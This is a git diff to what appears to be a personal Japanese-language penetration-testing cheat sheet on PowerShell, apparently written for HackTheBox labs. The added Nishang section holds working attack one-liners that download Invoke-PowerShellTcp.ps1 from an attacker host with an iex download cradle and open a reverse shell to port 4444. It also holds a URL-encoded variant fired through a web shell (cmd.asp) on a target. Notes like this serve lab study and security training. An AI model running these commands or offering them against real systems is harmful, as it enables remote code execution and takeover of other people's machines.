@@ -1,5 +1,7 @@
 # PowerShell
 
+[toc]
+
 ### 実行権限
 
 ```powershell
@@ -122,13 +124,30 @@ $dcsesh = New-PSSession -Computer SANDBOXDC
 
 https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
 
-### Nishang
+### Nishang(Invoke-PowerShellTcp.ps1)
+
+```bash
+┌──(kali㉿kali)-[~/Documents/tools/nishang/Shells]
+└─$ cp Invoke-PowerShellTcp.ps1 ~/Documents/HTB/Conceal 
+```
+
+##### ps1内で実行コマンドを書く場合
+
+![image-20230501100456153](img/powershell/image-20230501100456153.png)
 
 ```
 "iex(new-object net.webclient).downloadstring('http://192.168.119.133:8080/Invoke-PowerShellTcp.ps1')"
 ```
 
+##### 実行も一緒にする場合
+
 ```
 powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.3 -Port 4444
+```
+
+* エンコードバージョン
+
+```
+http://10.129.33.253/upload/cmd.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.75:8000/Invoke-PowerShellTcp.ps1%27)
 ```
 
